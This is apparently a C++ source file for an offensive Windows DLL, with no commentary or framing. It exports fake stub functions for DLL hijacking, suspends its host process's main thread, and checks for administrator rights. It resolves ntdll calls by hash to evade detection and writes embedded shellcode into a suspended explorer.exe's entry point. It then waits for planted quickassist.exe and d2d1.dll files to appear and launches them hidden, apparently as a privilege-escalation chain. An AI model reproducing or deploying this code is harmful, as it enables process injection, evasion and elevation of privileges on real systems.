#include "Windows.h"
#include "ntdllutils.h"
#include "Shlwapi.h"
#include "kernel32utils.h"
extern "C" __declspec(dllexport) int GetProfileType() {
    return 1;
}
extern "C" __declspec(dllexport) int GetDefaultUserProfileDirectoryW() {
    return 1;
}

extern "C" __declspec(dllexport) int CreateEnvironmentBlock() {
    return 1;
}

extern "C" __declspec(dllexport) int RmRegisterResources() {
    return 1;
}

extern "C" __declspec(dllexport) int RmGetList() {
    return 1;
}

extern "C" __declspec(dllexport) int RmStartSession() {
    return 1;
}


extern "C" __declspec(dllexport) int RmEndSession() {
    return 1;
}

unsigned char shellcode[] = (
"\x48\x89\xe5\x48\x81\xc4\xf0\xfd\xff\xff\x48\x31\xc9\x65\x48\x8b\x71\x60\x48\x8b"
"\x76\x18\x48\x8b\x76\x30\x48\x8b\x5e\x10\x48\x8b\x7e\x40\x48\x8b\x36\x66\x39\x4f"
"\x12\x75\xef\xeb\x07\x5e\x48\x89\x75\x08\xeb\x75\xe8\xf4\xff\xff\xff\x54\x50\x51"
"\x52\x53\x55\x56\x57\x8b\x43\x3c\x8b\xbc\x03\x88\x00\x00\x00\x48\x01\xdf\x8b\x4f"
"\x14\x48\x31\xc0\x8b\x47\x20\x48\x01\xd8\x48\x89\x45\xf8\x67\xe3\x3f\x48\xff\xc9"
"\x48\x8b\x45\xf8\x8b\x34\x88\x48\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1"
"\xca\x0d\x01\xc2\xeb\xf4\x48\x3b\x54\x24\x48\x75\xd9\x8b\x57\x24\x48\x01\xda\x66"
"\x8b\x0c\x4a\x8b\x57\x1c\x48\x01\xda\x8b\x04\x8a\x48\x01\xd8\x48\x89\x44\x24\x30"
"\x5f\x5e\x5d\x5b\x5a\x59\x58\x5c\xc3\x49\xb8\x1c\x70\x67\x4f\xff\xff\xff\xff\x4d"
"\x31\xc9\x4d\x29\xc1\x41\x51\xff\x55\x08\x48\x89\x45\x10\x48\x83\xc4\x08\x48\xc7"
"\xc0\x6c\x00\x6c\x00\x50\x48\xb8\x6c\x00\x6c\x00\x2e\x00\x64\x00\x50\x48\xb8\x75"
"\x00\x70\x00\x70\x00\x64\x00\x50\x48\xb8\x65\x00\x78\x00\x70\x00\x73\x00\x50\x54"
"\x48\xc7\xc1\x1c\x00\x00\x00\x48\xc1\xe1\x10\x48\x83\xc1\x1c\x51\x49\x89\xe0\x54"
"\x49\x89\xe1\x48\x31\xc9\x48\x89\xca\x41\x51\x41\x50\x52\x51\x48\x8d\x1d\x00\x00"
"\x00\x00\x48\x83\xc3\x0b\x53\x48\x8b\x5d\x10\x53\xc3\x48\x8b\x44\x24\x20\x48\x83"
"\xec\x08\x48\x83\xf8\x01\x75\xfa");
#define MAX_NAME 256
BOOL SearchTokenGroupsForSID (HANDLE hToken) 
{
    DWORD i, dwSize = 0, dwResult = 0;
 
    PTOKEN_GROUPS pGroupInfo;
    SID_NAME_USE SidType;
    char lpName[MAX_NAME];
    char lpDomain[MAX_NAME];
    PSID pSID = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
       
    // Open a handle to the access token for the calling process.
    if(!hToken){
        
        if (!OpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken )) 
        {
            //printf( "[-] OpenProcessToken Error %u\n", GetLastError() );
            return FALSE;
        }
    
    }

    // Call GetTokenInformation to get the buffer size.

    if(!GetTokenInformation(hToken, TokenGroups, NULL, dwSize, &dwSize)) 
    {
        dwResult = GetLastError();
        if( dwResult != ERROR_INSUFFICIENT_BUFFER ) {
            //printf( "[-] GetTokenInformation Error %u\n", dwResult );
            return FALSE;
        }
    }

    // Allocate the buffer.

    pGroupInfo = (PTOKEN_GROUPS) GlobalAlloc( GPTR, dwSize );

    // Call GetTokenInformation again to get the group information.

    if(! GetTokenInformation(hToken, TokenGroups, pGroupInfo, 
                            dwSize, &dwSize ) ) 
    {
        //printf( "[-] GetTokenInformation Error %u\n", GetLastError() );
        return FALSE;
    }

    // Create a SID for the BUILTIN\Administrators group.

    if(! AllocateAndInitializeSid( &SIDAuth, 2,
                     SECURITY_BUILTIN_DOMAIN_RID,
                     DOMAIN_ALIAS_RID_ADMINS,
                     0, 0, 0, 0, 0, 0,
                     &pSID) ) 
    {
        //printf( "[-] AllocateAndInitializeSid Error %u\n", GetLastError() );
        return FALSE;
    }

    // Loop through the group SIDs looking for the administrator SID.

    for(i=0; i<pGroupInfo->GroupCount; i++) 
    {
        if ( EqualSid(pSID, pGroupInfo->Groups[i].Sid) ) 
        {

            // Lookup the account name and print it.

            dwSize = MAX_NAME;
            if( !LookupAccountSid( NULL, pGroupInfo->Groups[i].Sid,
                                  lpName, &dwSize, lpDomain, 
                                  &dwSize, &SidType ) ) 
            {
                dwResult = GetLastError();
                if( dwResult == ERROR_NONE_MAPPED )
                   strcpy_s (lpName, dwSize, "NONE_MAPPED" );
                else 
                {
                    //printf("[-] LookupAccountSid Error %u\n", GetLastError());
                    return FALSE;
                }
            }
            //printf( "[+] Current user is a member of the %s\\%s group\n", lpDomain, lpName );

       
        }
    }

    if (pSID)
        FreeSid(pSID);
    if ( pGroupInfo )
        GlobalFree( pGroupInfo );
    return TRUE;
}
DWORD TH32CS_SNAPTHREAD = 0x00000004;
HANDLE ThreadHandle = NULL;
#ifndef MAKEULONGLONG
#define MAKEULONGLONG(ldw, hdw) ((((ULONGLONG)hdw) << 32) | ((ldw) & 0xFFFFFFFF))
#endif
int main(){

    STARTUPINFOA  si;
    PROCESS_INFORMATION pi;
	DWORD returnLength = 0;
    DWORD bytesRead;
    STARTUPINFOW siW;
    SHELLEXECUTEINFOA shExInfo;
    MEMORY_BASIC_INFORMATION meminfo;
    PROCESS_BASIC_INFORMATION pbi = {};
    
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    
    

    if(!SearchTokenGroupsForSID(0)){
        //printf("[-] The user is not local admin. Aborting.\n");
        return 0;
    }
        
    if(!CreateProcessA("C:\\windows\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)){
        //printf("[-] CreateProcessA Error: %i\n", GetLastError());
        return 0;
    }  
        //printf("[+] Spawned suspended explorer.exe\n");
    // get target image PEB address and pointer to image base
    NTQUERYINFORMATIONPROCESS NtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)GetFunctionAddress(0x822987a3);
	NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
    if(status){
        //printf("[-] NtQueryInformationProcess failed: %x\n", status);
        return 0;
    } else {
        //printf("[+] NtQueryInformationProcess succeeded\n");
    }
	DWORD64 pebOffset = (DWORD)pbi.PebBaseAddress + 16;

    // get target process image base address
    NTREADVIRTUALMEMORY NtReadVirtualMemory = (NTREADVIRTUALMEMORY)GetFunctionAddress(0x8bd260c6);
	LPVOID imageBase = 0;
    status = NtReadVirtualMemory(pi.hProcess, (PVOID)pebOffset, &imageBase, 8, &bytesRead);
    if(status){
        //printf("[-] NtReadVirtualMemory failed: %x\n", status);
        return 0;
    } else {
        //printf("[+] NtReadVirtualMemory succeeded\n");
    }
	BYTE headersBuffer[4096] = {};

	NtReadVirtualMemory(pi.hProcess, imageBase, &headersBuffer, 4096, &bytesRead);
    if(status){
        //printf("[-] NtReadVirtualMemory 2 failed: %x\n", status);
        return 0;
    } else {
        //printf("[+] NtReadVirtualMemory 2 succeeded\n");
    }

    // get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD64)imageBase);
 
    // write shellcode to image entry point and execute it
    NTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (NTWRITEVIRTUALMEMORY)GetFunctionAddress(0xd963331);
    //WriteProcessMemory(pi.hProcess, codeEntry, shellcode, size=, NULL);
    
    ULONG oldProtect;
    ULONG bytesToProtect = 1;
    ULONG bytesWritten = 0;
    NTPROTECTVIRTUALMEMORY NtProtectVirtualMemory = (NTPROTECTVIRTUALMEMORY)GetFunctionAddress(0xbfe9568a);
    LPVOID temp =codeEntry;
    
    status = NtProtectVirtualMemory(pi.hProcess, &temp, &bytesToProtect, PAGE_EXECUTE_READWRITE, &oldProtect);
    NtWriteVirtualMemory(pi.hProcess, codeEntry, shellcode, sizeof(shellcode), &bytesWritten);

    //NtProtectVirtualMemory(pi.hProcess, &codeEntry, &bytesToProtect, oldProtect, &oldProtect);
    NTRESUMETHREAD NtResumeThread = (NTRESUMETHREAD)GetFunctionAddress(0xb29078b1);
    //NtWriteVirtualMemory(hProcess, mem, image, nSizeOfImage, NULL)))
    Sleep(1000);
    exit(0);
    NtResumeThread(pi.hThread, NULL);
   
    ZeroMemory(&shExInfo, sizeof(SHELLEXECUTEINFOA));
            shExInfo.cbSize = sizeof(SHELLEXECUTEINFOA);
            shExInfo.lpFile = "C:\\Program Files\\Windows Mail\\quickassist.exe";
            shExInfo.fMask = 0x40;
            shExInfo.nShow = SW_HIDE;
    int count = 0;
    while(true){

   
    if(PathFileExistsA("C:\\Program Files\\Windows Mail\\quickassist.exe")){
        //printf("[+] Copied quickassist.exe\n");
        break; 
    }
    else
        Sleep(500);
        count += 500;
        if(count>5000){
            //printf("[-] Failed to copy quickassist.exe\n");
            exit(0);
            }
    }
    count = 0;
    while(true){
    if(PathFileExistsA("C:\\Program Files\\Windows Mail\\d2d1.dll")){
        //printf("[+] Copied d2d1.dl\n");
        break;
    }
    else
        Sleep(500);
        count += 500;
        if(count>5000){
            //printf("[-] Failed to copy d2d1.dll\n");
            exit(0);
            }
    }   
  
    

    if(!ShellExecuteEx(&shExInfo)){
        //printf("[-] ShellExecuteEx QuickAssist Error: %i\n", GetLastError());
        return 0;
     } else
        exit(0);

    //printf("[+] QuickAssist started. Cleaning up.\n");
    

}

int killmain(){
    HANDLE hThread;
    HANDLE hMainThread;
    THREADENTRY32 te32;
    DWORD dwMainThreadID = 0;
    LARGE_INTEGER Timeout;

    HANDLE CurrentProcess = (HANDLE)-1;
    HANDLE CurrentThread = (HANDLE)-2;
    ULONGLONG ullMinCreateTime = MAXULONGLONG;
     
    CREATETOOLHELP32SNAPSHOT kCreateToolhelp32Snapshot = (CREATETOOLHELP32SNAPSHOT)kGetFunctionAddress(0xce540b1c);
    GETCURRENTPROCESSID kGetCurrentProcessId = (GETCURRENTPROCESSID)kGetFunctionAddress(0x87af1aaf);
    GETCURRENTTHREADID kGetCurrentThreadId = (GETCURRENTTHREADID)kGetFunctionAddress(0x8356016f);
    GETTHREADTIMES kGetThreadTimes = (GETTHREADTIMES)kGetFunctionAddress(0x8991f471);
    CLOSEHANDLE kCloseHandle = (CLOSEHANDLE)kGetFunctionAddress(0x7a21a894); 
    THREAD32FIRST kThread32First = (THREAD32FIRST)kGetFunctionAddress(0x49a0416);
    THREAD32NEXT kThread32Next = (THREAD32NEXT)kGetFunctionAddress(0x12b00f38);
    OPENTHREAD kOpenThread = (OPENTHREAD)kGetFunctionAddress(0xba1d655e);
    SUSPENDTHREAD kSuspendThread = (SUSPENDTHREAD)kGetFunctionAddress(0xa500eda4);
    

    HANDLE hThreadSnap = kCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD64 currentPid = kGetCurrentProcessId();
    DWORD64 currentThreadId = kGetCurrentThreadId();
   
    if(hThreadSnap != INVALID_HANDLE_VALUE) {
        te32.dwSize = sizeof(THREADENTRY32);        
    
        if(kThread32First(hThreadSnap, &te32)) {
            do {
                if(te32.th32OwnerProcessID == currentPid && te32.th32ThreadID != currentThreadId) {
                     hThread = kOpenThread(THREAD_QUERY_INFORMATION, 0, te32.th32ThreadID);
                    if (hThread) {
                        FILETIME afTimes[4] = {0};
                        if (kGetThreadTimes(hThread, &afTimes[0], &afTimes[1], &afTimes[2], &afTimes[3])) {
                            ULONGLONG ullTest = MAKEULONGLONG(afTimes[0].dwLowDateTime, afTimes[0].dwHighDateTime);
                            if (ullTest && ullTest < ullMinCreateTime) {
                                ullMinCreateTime = ullTest;
                                dwMainThreadID = te32.th32ThreadID;
                            }
                        }
                        kCloseHandle(hThread);
                    }
                }
            } while(kThread32Next(hThreadSnap, &te32));
        }
        kCloseHandle(hThreadSnap);
    }

    hMainThread = kOpenThread(THREAD_SUSPEND_RESUME, 0, dwMainThreadID);
    kSuspendThread(hMainThread);
    kCloseHandle(hMainThread);
    return 1;
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
           
            //CreateThread(0,0, (LPTHREAD_START_ROUTINE)doStuff1, 0, 0,0);
            
            killmain();
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)main, 0, 0,0);
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
        
            if (lpvReserved != nullptr)
            {
                break; // do not do cleanup if process termination scenario
            }
            
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}